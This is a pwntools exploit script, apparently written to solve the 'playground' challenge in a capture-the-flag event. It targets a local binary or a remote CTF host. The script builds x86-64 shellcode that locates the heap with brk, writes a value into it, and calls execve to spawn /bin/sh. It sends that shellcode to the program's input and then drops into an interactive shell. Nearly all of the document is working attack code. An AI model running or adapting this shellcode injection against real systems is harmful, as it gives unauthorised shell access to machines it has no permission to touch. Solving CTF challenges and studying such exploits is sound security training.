#!/usr/bin/python3

from pwn import *

exe = ELF('playground_patched', checksec=False)
libc = ELF("libc.so.6")
context.binary = exe
def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1767 
        # b* 0xc0de10f
        c
        ''')
        input()


if args.REMOTE:
    p = remote('playtime.squ1rrel-ctf-codelab.kctf.cloud', 1337)
else:
    p = process(exe.path)
GDB()
pa = asm('''
             mov rax, 12
    mov rdi, 0
    syscall 


    sub rax, 0x21000
    add rax, 0x2a0
    
    mov rcx, 7449354445942777647
    mov [rax], rcx
    add rax, 8
    mov rcx, 0x0
    mov [rax], rcx
    sub rax, 8
    
    mov rdi, rax
    mov rsi, 0
    mov rdx, 0
    mov rax, 0x3b
    syscall
         ''')
sla(b'play?', bytes(pa) + b'/bin/sh\0')
p.interactive()
